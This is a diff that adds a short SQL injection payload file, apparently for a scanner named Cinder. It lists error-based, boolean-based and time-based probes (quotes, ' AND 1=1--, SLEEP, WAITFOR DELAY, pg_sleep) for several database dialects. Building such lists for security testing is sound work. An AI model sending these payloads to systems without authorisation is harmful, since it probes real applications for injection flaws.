@@ -1,0 +1,22 @@
+# Cinder SQLi payloads
+# Format: <technique> | <dialect> | <payload>
+# Lines starting with # are ignored.
+
+# --- error-based ---
+error | mysql      | '
+error | mysql      | "
+error | mysql      | \)
+error | mssql      | '
+error | mssql      | "
+error | postgresql | '
+error | oracle     | '
+error | sqlite     | '
+
+# --- boolean-based ---
+bool_true  | generic | ' AND 1=1-- 
+bool_false | generic | ' AND 1=2-- 
+
+# --- time-based ---
+time | mysql      | ' OR SLEEP(5)-- 
+time | mssql      | '; WAITFOR DELAY '0:0:5'-- 
+time | postgresql | ' OR pg_sleep(5)-- 
